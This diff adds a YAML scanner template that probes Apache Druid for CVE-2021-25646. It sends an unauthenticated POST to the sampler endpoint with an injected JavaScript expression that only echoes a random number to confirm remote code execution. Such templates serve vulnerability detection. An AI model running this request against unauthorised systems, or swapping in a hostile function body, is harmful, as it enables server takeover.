@@ -1,0 +1,17 @@
+name: poc-druid-js
+transport: http
+set:
+  r0: randomInt(1000, 9999)
+rules:
+  r0:
+    request:
+      method: POST
+      path: "/druid/indexer/v1/sampler"
+      body: '{"type":"index","spec":{"ioConfig":{"type":"index","firehose":{"type":"inline","data":"{\"t\":\"1\"}"}},"dataSchema":{"dataSource":"x","timestampSpec":{"column":"t","format":"iso"},"dimensionsSpec":{"dimensions":[]},"granularitySpec":{"type":"uniform","granularity":"DAY"},"transformSpec":{"transforms":[{"type":"expression","name":"x","expression":{"type":"javascript","function":"function(){return ''{{r0}}''}"}}]}},"tuningConfig":{"type":"index","maxRowsPerSegment":1}},"samplerConfig":{"numRows":1,"timeoutMs":15000}}'
+    expression: response.status == 200 && (response.body.bcontains("{{r0}}") || response.body.bcontains("error"))
+expression: r0()
+detail:
+  author: sxel
+  description: Apache Druid JavaScript expression RCE probe (CVE-2021-25646, unauthenticated sampler endpoint)
+  severity: high
+  tags: druid,apache,java,rce
